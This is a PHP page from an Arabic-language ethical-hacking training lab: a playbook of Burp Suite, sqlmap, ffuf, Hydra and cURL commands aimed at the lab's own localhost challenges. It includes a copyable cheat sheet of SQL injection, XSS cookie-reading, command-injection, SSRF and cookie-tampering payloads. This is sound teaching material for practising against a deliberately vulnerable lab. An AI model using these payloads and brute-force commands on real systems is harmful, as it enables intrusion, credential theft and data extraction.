<?php
// ==============================================================================
// ترسانة أدوات الهاكر الأخلاقي (Hacking Tools & Cheat Sheets Playbook)
// إعداد وتطوير: المهندس احمد سليم 🇵🇸
// ==============================================================================

$page_title = "ترسانة أدوات الهاكر الأخلاقي | مختبر الجوكر الفلسطيني";
require_once __DIR__ . '/../includes/header.php';
?>

<div class="row mb-4">
    <div class="col-12">
        <!-- Header Banner -->
        <div class="card border-0 shadow-lg mb-4" style="background: linear-gradient(135deg, #101726 0%, #090e18 100%); border-right: 5px solid #06b6d4 !important;">
            <div class="card-body p-4 d-flex flex-wrap justify-content-between align-items-center gap-3">
                <div>
                    <span class="badge bg-black border border-info text-info px-3 py-1 mb-2 fs-6">
                        <i class="fas fa-terminal me-1"></i> Offensive Security Playbook
                    </span>
                    <h2 class="text-white fw-bold mb-1">
                        ترسانة أدوات الهاكر الأخلاقي واختبار الاختراق (Tools Arsenal)
                    </h2>
                    <p class="text-muted mb-0">
                        دليل تطبيقي شامل ومجهز بأوامر حقيقية وسيناريوهات استغلال فورية مخصصة لتحديات مختبر الجوكر الفلسطيني.
                    </p>
                </div>
                <div class="text-end">
                    <div class="badge bg-black border border-warning text-warning p-2 px-3 fs-6 rounded-pill">
                        إعداد وتطوير: <strong class="text-white">المهندس احمد سليم 🇵🇸</strong>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Tabs for Tools Navigation -->
<ul class="nav nav-pills nav-fill gap-2 p-2 bg-dark rounded-3 mb-4 border border-secondary" id="toolsTab" role="tablist">
    <li class="nav-item" role="presentation">
        <button class="nav-link active fw-bold text-nowrap" id="burp-tab" data-bs-toggle="tab" data-bs-target="#burp-pane" type="button" role="tab">
            <i class="fas fa-shield-alt text-warning me-1"></i> 1. Burp Suite
        </button>
    </li>
    <li class="nav-item" role="presentation">
        <button class="nav-link fw-bold text-nowrap" id="sqlmap-tab" data-bs-toggle="tab" data-bs-target="#sqlmap-pane" type="button" role="tab">
            <i class="fas fa-database text-info me-1"></i> 2. sqlmap
        </button>
    </li>
    <li class="nav-item" role="presentation">
        <button class="nav-link fw-bold text-nowrap" id="ffuf-tab" data-bs-toggle="tab" data-bs-target="#ffuf-pane" type="button" role="tab">
            <i class="fas fa-search text-success me-1"></i> 3. ffuf & Fuzzing
        </button>
    </li>
    <li class="nav-item" role="presentation">
        <button class="nav-link fw-bold text-nowrap" id="hydra-tab" data-bs-toggle="tab" data-bs-target="#hydra-pane" type="button" role="tab">
            <i class="fas fa-key text-danger me-1"></i> 4. Hydra (Brute)
        </button>
    </li>
    <li class="nav-item" role="presentation">
        <button class="nav-link fw-bold text-nowrap" id="curl-tab" data-bs-toggle="tab" data-bs-target="#curl-pane" type="button" role="tab">
            <i class="fas fa-code text-primary me-1"></i> 5. cURL & APIs
        </button>
    </li>
    <li class="nav-item" role="presentation">
        <button class="nav-link fw-bold text-nowrap" id="cheat-tab" data-bs-toggle="tab" data-bs-target="#cheat-pane" type="button" role="tab">
            <i class="fas fa-bolt text-warning me-1"></i> 6. Cheat Sheet
        </button>
    </li>
</ul>

<!-- Tabs Content Area -->
<div class="tab-content" id="toolsTabContent">

    <!-- 1. Burp Suite -->
    <div class="tab-pane fade show active" id="burp-pane" role="tabpanel">
        <div class="card card-cyber p-4 mb-4">
            <div class="d-flex justify-content-between align-items-center mb-3">
                <h4 class="text-warning fw-bold mb-0"><i class="fas fa-spider me-2"></i> أداة Burp Suite: السيطرة واعتراض الطلبات (Intercept & Repeater)</h4>
                <span class="badge bg-warning text-dark fw-bold">Proxy / Intercept</span>
            </div>
            <p class="text-light">
                تعتبر Burp Suite الأداة رقم #1 عالمياً لاختبار اختراق تطبيقات الويب. تعمل كوسيط (Proxy) بين متصفحك وسيرفر المختبر لتمكينك من تجميد وتعديل أي طلب HTTP قبل وصوله للخادم.
            </p>

            <h5 class="text-info fw-bold mt-3 mb-2"><i class="fas fa-play-circle me-1"></i> سيناريو تطبيقي 1: اختراق الصلاحيات والكوكي (Broken Access Control)</h5>
            <div class="p-3 bg-black rounded border border-secondary mb-3">
                <ol class="mb-0 text-light ps-3">
                    <li class="mb-2">افتح المتصفح المدمج داخل Burp Suite (Open Browser) وتوجه إلى: <code>http://localhost:8000/pages/access_control.php</code>.</li>
                    <li class="mb-2">قم بتفعيل ميزة <strong>Proxy &rarr; Intercept is on</strong>.</li>
                    <li class="mb-2">اضغط على زر "دخول لوحة الإدارة" في صفحة التحدي.</li>
                    <li class="mb-2">ستلاحظ أن الطلب تجمد داخل Burp. قم بتعديل سطر الكوكي من:
                        <br><code class="text-danger">Cookie: user_role=student</code>
                        <br>إلى:
                        <br><code class="text-success">Cookie: user_role=admin</code>
                    </li>
                    <li>اضغط على <strong>Forward</strong> &larr; مبروك! ظهرت لوحة المدير العامة والعلم السري فوراً!</li>
                </ol>
            </div>

            <h5 class="text-info fw-bold mt-3 mb-2"><i class="fas fa-sync me-1"></i> سيناريو تطبيقي 2: استخدام Repeater لتجربة البايلودات السريعة</h5>
            <p class="text-muted small">
                بدلاً من إعادة كتابة المدخلات في المتصفح، اضغط <kbd>Ctrl + R</kbd> داخل Burp لنقل الطلب إلى <strong>Repeater</strong>، حيث يمكنك إرسال عشرات البايلودات لثغرة SQLi أو XSS بضغطة زر واحدة (Send) وفحص الردود مباشرة.
            </p>
        </div>
    </div>

    <!-- 2. sqlmap -->
    <div class="tab-pane fade" id="sqlmap-pane" role="tabpanel">
        <div class="card card-cyber p-4 mb-4">
            <div class="d-flex justify-content-between align-items-center mb-3">
                <h4 class="text-info fw-bold mb-0"><i class="fas fa-database me-2"></i> أداة sqlmap: الأتمتة الخارقة لاختراق قواعد البيانات</h4>
                <span class="badge bg-info text-dark fw-bold">SQL Injection Auto-Pwn</span>
            </div>
            <p class="text-light">
                الأداة الأقوى في الكشف عن ثغرات SQLi بأنواعها (Error, Boolean, Time, UNION) واستخراج الجداول والبيانات السرية تلقائياً.
            </p>

            <h5 class="text-warning fw-bold mt-3 mb-2">أوامر التنفيذ المباشرة على تحدي المختبر (<code>pages/sqli.php</code>):</h5>

            <!-- Command 1 -->
            <div class="bg-black p-3 rounded border border-secondary mb-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <small class="text-muted fw-bold">1. فحص معامل البحث واكتشاف نوع قاعدة البيانات:</small>
                    <button class="btn btn-outline-info btn-sm copy-cmd-btn" data-cmd='sqlmap -u "http://localhost:8000/pages/sqli.php?search=test" --batch'>
                        <i class="fas fa-copy me-1"></i> نسخ الأمر
                    </button>
                </div>
                <code class="text-warning font-monospace d-block" dir="ltr">sqlmap -u "http://localhost:8000/pages/sqli.php?search=test" --batch</code>
            </div>

            <!-- Command 2 -->
            <div class="bg-black p-3 rounded border border-secondary mb-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <small class="text-muted fw-bold">2. استخراج قائمة الجداول (Tables) داخل قاعدة البيانات:</small>
                    <button class="btn btn-outline-info btn-sm copy-cmd-btn" data-cmd='sqlmap -u "http://localhost:8000/pages/sqli.php?search=test" --tables --batch'>
                        <i class="fas fa-copy me-1"></i> نسخ الأمر
                    </button>
                </div>
                <code class="text-warning font-monospace d-block" dir="ltr">sqlmap -u "http://localhost:8000/pages/sqli.php?search=test" --tables --batch</code>
            </div>

            <!-- Command 3 -->
            <div class="bg-black p-3 rounded border border-secondary">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <small class="text-muted fw-bold">3. سحب محتويات جدول المنتجات (products) واستخراج الأعلام السرية:</small>
                    <button class="btn btn-outline-info btn-sm copy-cmd-btn" data-cmd='sqlmap -u "http://localhost:8000/pages/sqli.php?search=test" -T products --dump --batch'>
                        <i class="fas fa-copy me-1"></i> نسخ الأمر
                    </button>
                </div>
                <code class="text-warning font-monospace d-block" dir="ltr">sqlmap -u "http://localhost:8000/pages/sqli.php?search=test" -T products --dump --batch</code>
            </div>
        </div>
    </div>

    <!-- 3. ffuf -->
    <div class="tab-pane fade" id="ffuf-pane" role="tabpanel">
        <div class="card card-cyber p-4 mb-4">
            <div class="d-flex justify-content-between align-items-center mb-3">
                <h4 class="text-success fw-bold mb-0"><i class="fas fa-tachometer-alt me-2"></i> أداة ffuf: الفحص السريع والـ Fuzzing للمسارات والملفات</h4>
                <span class="badge bg-success text-dark fw-bold">Fast Web Fuzzer</span>
            </div>
            <p class="text-light">
                أسرع أداة فحص مسارات مكتوبة بلغة Go. تقوم بإرسال آلاف الطلبات في الثواني لاكتشاف الصفحات والملفات المخفية.
            </p>

            <!-- Command 1 -->
            <div class="bg-black p-3 rounded border border-secondary mb-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <small class="text-muted fw-bold">اكتشاف الملفات السرية داخل مجلد pages (مثل secret_note.txt):</small>
                    <button class="btn btn-outline-success btn-sm copy-cmd-btn" data-cmd='ffuf -u http://localhost:8000/pages/FUZZ.txt -w /usr/share/wordlists/dirb/common.txt -mc 200'>
                        <i class="fas fa-copy me-1"></i> نسخ الأمر
                    </button>
                </div>
                <code class="text-success font-monospace d-block" dir="ltr">ffuf -u http://localhost:8000/pages/FUZZ.txt -w /usr/share/wordlists/dirb/common.txt -mc 200</code>
            </div>

            <!-- Command 2 -->
            <div class="bg-black p-3 rounded border border-secondary">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <small class="text-muted fw-bold">فحص معاملات GET المخفية (Parameter Fuzzing):</small>
                    <button class="btn btn-outline-success btn-sm copy-cmd-btn" data-cmd='ffuf -u "http://localhost:8000/pages/lfi.php?FUZZ=about.txt" -w /usr/share/wordlists/wfuzz/general/common.txt -mc 200'>
                        <i class="fas fa-copy me-1"></i> نسخ الأمر
                    </button>
                </div>
                <code class="text-success font-monospace d-block" dir="ltr">ffuf -u "http://localhost:8000/pages/lfi.php?FUZZ=about.txt" -w /usr/share/wordlists/wfuzz/general/common.txt -mc 200</code>
            </div>
        </div>
    </div>

    <!-- 4. Hydra -->
    <div class="tab-pane fade" id="hydra-pane" role="tabpanel">
        <div class="card card-cyber p-4 mb-4">
            <div class="d-flex justify-content-between align-items-center mb-3">
                <h4 class="text-danger fw-bold mb-0"><i class="fas fa-bomb me-2"></i> أداة Hydra: التخمين على استمارات الدخول (Brute Force)</h4>
                <span class="badge bg-danger">Password Cracker</span>
            </div>
            <p class="text-light">
                الأداة المعيارية لهجمات القوة الغاشمة على نماذج تسجيل الدخول وخدمات الشبكة.
            </p>

            <div class="bg-black p-3 rounded border border-secondary mb-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <small class="text-muted fw-bold">كسر كلمة مرور حساب المدير في تحدي bruteforce.php:</small>
                    <button class="btn btn-outline-danger btn-sm copy-cmd-btn" data-cmd='hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8000 http-post-form "/pages/bruteforce.php:username=^USER^&password=^PASS^:F=كلمة المرور غير صحيحة"'>
                        <i class="fas fa-copy me-1"></i> نسخ الأمر
                    </button>
                </div>
                <code class="text-danger font-monospace d-block" dir="ltr">hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8000 http-post-form "/pages/bruteforce.php:username=^USER^&password=^PASS^:F=كلمة المرور غير صحيحة"</code>
            </div>
            <div class="alert alert-dark border-secondary small mb-0">
                <strong class="text-warning"><i class="fas fa-info-circle me-1"></i> شرح المعاملات:</strong>
                <code>-l admin</code> اسم المستخدم المستهدف | <code>-P rockyou.txt</code> قائمة كلمات المرور | <code>F=...</code> النص الذي يظهر عند فشل الدخول ليتجاهله البرنامج.
            </div>
        </div>
    </div>

    <!-- 5. cURL -->
    <div class="tab-pane fade" id="curl-pane" role="tabpanel">
        <div class="card card-cyber p-4 mb-4">
            <div class="d-flex justify-content-between align-items-center mb-3">
                <h4 class="text-primary fw-bold mb-0"><i class="fas fa-terminal me-2"></i> أداة cURL: الاختبار السريع من سطر الأوامر وأتمتة الـ APIs</h4>
                <span class="badge bg-primary">CLI Powerhouse</span>
            </div>

            <!-- cURL SSRF -->
            <div class="bg-black p-3 rounded border border-secondary mb-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <small class="text-muted fw-bold">1. استغلال ثغرة SSRF وسحب ملف secret_note عبر سطر الأوامر:</small>
                    <button class="btn btn-outline-info btn-sm copy-cmd-btn" data-cmd='curl -s -X POST http://localhost:8000/pages/ssrf.php -d "url=http://localhost/pages/secret_note.txt" | grep "FLAG{"'>
                        <i class="fas fa-copy me-1"></i> نسخ
                    </button>
                </div>
                <code class="text-info font-monospace d-block" dir="ltr">curl -s -X POST http://localhost:8000/pages/ssrf.php -d "url=http://localhost/pages/secret_note.txt" | grep "FLAG{"</code>
            </div>

            <!-- cURL CMDi -->
            <div class="bg-black p-3 rounded border border-secondary">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <small class="text-muted fw-bold">2. تنفيذ أوامر النظام عبر POST request في ثغرة Command Injection:</small>
                    <button class="btn btn-outline-info btn-sm copy-cmd-btn" data-cmd='curl -s -X POST http://localhost:8000/pages/cmdi.php -d "ip=127.0.0.1 %26 whoami"'>
                        <i class="fas fa-copy me-1"></i> نسخ
                    </button>
                </div>
                <code class="text-info font-monospace d-block" dir="ltr">curl -s -X POST http://localhost:8000/pages/cmdi.php -d "ip=127.0.0.1 %26 whoami"</code>
            </div>
        </div>
    </div>

    <!-- 6. Cheat Sheet -->
    <div class="tab-pane fade" id="cheat-pane" role="tabpanel">
        <div class="card card-cyber p-4 mb-4">
            <h4 class="text-warning fw-bold mb-3"><i class="fas fa-bolt me-2"></i> الجداول التفاعلية لأخطر البايلودات (Live Payload Cheat Sheet)</h4>
            <p class="text-light">انسخ أي بايلود واستخدمه مباشرة في التحديات:</p>

            <div class="table-responsive">
                <table class="table table-bordered table-dark-custom align-middle">
                    <thead class="table-dark">
                        <tr>
                            <th>الثغرة</th>
                            <th>البايلود الجاهز (Payload)</th>
                            <th>الهدف من البايلود</th>
                            <th class="text-center">إجراء</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="text-warning fw-bold">SQLi Auth Bypass</td>
                            <td><code class="text-warning">admin' --</code></td>
                            <td>تجاوز فحص كلمة المرور وتسجيل الدخول كمدير</td>
                            <td class="text-center"><button class="btn btn-sm btn-outline-warning copy-cmd-btn" data-cmd="admin' --"><i class="fas fa-copy"></i></button></td>
                        </tr>
                        <tr>
                            <td class="text-warning fw-bold">SQLi UNION Dump</td>
                            <td><code class="text-warning">' UNION SELECT 1, 'سري', 'Flags', 0, secret_code FROM products --</code></td>
                            <td>استخراج حقل الأعلام السري من جدول products</td>
                            <td class="text-center"><button class="btn btn-sm btn-outline-warning copy-cmd-btn" data-cmd="' UNION SELECT 1, 'سري', 'Flags', 0, secret_code FROM products --"><i class="fas fa-copy"></i></button></td>
                        </tr>
                        <tr>
                            <td class="text-info fw-bold">XSS Alert</td>
                            <td><code class="text-info">&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></td>
                            <td>تنفيذ كود جافاسكربت في سياق متصفح الضحية</td>
                            <td class="text-center"><button class="btn btn-sm btn-outline-info copy-cmd-btn" data-cmd="<script>alert(document.domain)</script>"><i class="fas fa-copy"></i></button></td>
                        </tr>
                        <tr>
                            <td class="text-info fw-bold">XSS Image Error</td>
                            <td><code class="text-info">&lt;img src=x onerror=alert(document.cookie)&gt;</code></td>
                            <td>تجاوز فلاتر الوسوم النصية عبر عنصر صورة تالف</td>
                            <td class="text-center"><button class="btn btn-sm btn-outline-info copy-cmd-btn" data-cmd="<img src=x onerror=alert(document.cookie)>"><i class="fas fa-copy"></i></button></td>
                        </tr>
                        <tr>
                            <td class="text-danger fw-bold">LFI Path Traversal</td>
                            <td><code class="text-danger">secret_note.txt</code></td>
                            <td>قراءة ملفات سرية داخل مجلدات التطبيق</td>
                            <td class="text-center"><button class="btn btn-sm btn-outline-danger copy-cmd-btn" data-cmd="secret_note.txt"><i class="fas fa-copy"></i></button></td>
                        </tr>
                        <tr>
                            <td class="text-danger fw-bold">Command Chaining</td>
                            <td><code class="text-danger">127.0.0.1 & whoami</code></td>
                            <td>تنفيذ أمر whoami إضافي على سيرفر الاستضافة</td>
                            <td class="text-center"><button class="btn btn-sm btn-outline-danger copy-cmd-btn" data-cmd="127.0.0.1 & whoami"><i class="fas fa-copy"></i></button></td>
                        </tr>
                        <tr>
                            <td class="text-primary fw-bold">SSRF Localhost</td>
                            <td><code class="text-primary">http://localhost/pages/secret_note.txt</code></td>
                            <td>استغلال السيرفر لقراءة ملفات وشبكات داخلية</td>
                            <td class="text-center"><button class="btn btn-sm btn-outline-primary copy-cmd-btn" data-cmd="http://localhost/pages/secret_note.txt"><i class="fas fa-copy"></i></button></td>
                        </tr>
                        <tr>
                            <td class="text-success fw-bold">Cookie Admin</td>
                            <td><code class="text-success">document.cookie="user_role=admin; path=/"</code></td>
                            <td>تعديل ملف الكوكي عبر الكونسول لتصعيد الصلاحيات</td>
                            <td class="text-center"><button class="btn btn-sm btn-outline-success copy-cmd-btn" data-cmd='document.cookie="user_role=admin; path=/"'><i class="fas fa-copy"></i></button></td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

</div>

<!-- Copy to clipboard script -->
<script>
document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('.copy-cmd-btn').forEach(function(btn) {
        btn.addEventListener('click', function() {
            const cmd = this.getAttribute('data-cmd');
            navigator.clipboard.writeText(cmd).then(() => {
                const originalHtml = this.innerHTML;
                this.innerHTML = '<i class="fas fa-check text-success"></i> تم النسخ!';
                setTimeout(() => {
                    this.innerHTML = originalHtml;
                }, 1800);
            });
        });
    });
});
</script>

<?php require_once __DIR__ . '/../includes/footer.php'; ?>
